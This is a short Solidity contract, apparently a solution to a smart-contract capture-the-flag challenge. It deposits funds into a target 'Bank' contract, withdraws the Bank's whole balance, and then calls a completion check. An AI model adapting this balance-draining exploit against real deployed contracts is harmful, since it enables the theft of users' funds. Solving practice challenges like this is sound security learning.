// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Exploit{
    Bank bank;
    constructor(address _bank) public {
        bank = Bank(_bank);
    }

    function attack() public payable{
        bank.deposit{value : msg.value}(msg.value);
        bank.withdraw(address(bank).balance);
        bank.isCompleted();
    }

    fallback() external payable{

    }
}